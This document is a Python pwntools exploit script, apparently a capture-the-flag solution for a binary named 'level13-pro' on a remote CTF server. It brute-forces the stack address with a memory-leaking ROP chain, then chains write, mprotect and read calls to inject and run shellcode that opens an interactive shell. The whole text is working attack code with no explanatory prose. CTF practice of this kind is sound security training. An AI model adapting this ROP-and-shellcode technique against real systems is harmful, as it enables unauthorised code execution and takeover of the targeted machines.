from pwn import *
context.log_level = "debug"
pwn_file = "./level13-pro"

def debug():
    log.debug("process pid:%d"%r.pid)
    pause()

inject_pos = 0x8048500
eax_val = 0x7d
ebx_val = 0x8048000
ecx_val = 0x1000
edx_val = 0x7

ris_call   = 0x80480fe
read_addr  = 0x80480E1
write_addr = 0x80480F9
bug_func = 0x804811e
next_pos   = 0x804817C

mark = "I'm your father."
print len(mark)
def detect_stack(r,detect_addr):
    rop = [mark, p32(write_addr),p32(bug_func),p32(1),p32(detect_addr),p32(0x800)]
    payload = ''.join(rop)
    
    r.sendafter("ROP like a PRO:",payload)
    a = r.recvuntil("Good Luck!\n")
    print a
    try:
        words=r.recv()
        if words.find(mark)>=0:
            print "===================="
            return detect_addr + words.find(mark)
        else:
            r.close()
            return -1
    except:
        r.close()
        return -1

stack_base = 0xff800000
for i in range(0x1000):
    detect_addr = stack_base + i*0x800
    r= remote("pwn.sixstars.team",22013)#r = process("./level13-pro")
    stack_addr = detect_stack(r, detect_addr)
    if stack_addr>=0:
        print "======the stack in use is======"
        print hex(stack_addr)
        break

sh = asm(shellcraft.sh())
rop2 = ['a'*0x14,p32(write_addr),p32(next_pos),p32(1),p32(ebx_val),p32(eax_val),
        'a'*0x14,p32(ris_call), p32(next_pos),p32(ebx_val),p32(ecx_val),p32(edx_val),
        'a'*0x14,p32(read_addr),p32(inject_pos),p32(0),p32(inject_pos),p32(0x100)]
payload2 = ''.join(rop2)

rop1 = ['a'*0x10, p32(read_addr),p32(next_pos),p32(0),p32(stack_addr+0x24+8) ,p32(len(payload2)) ]
payload1 = ''.join(rop1)

r.send(payload1)
r.send(payload2)

r.recv(0x7d)

r.sendline(sh)
r.interactive()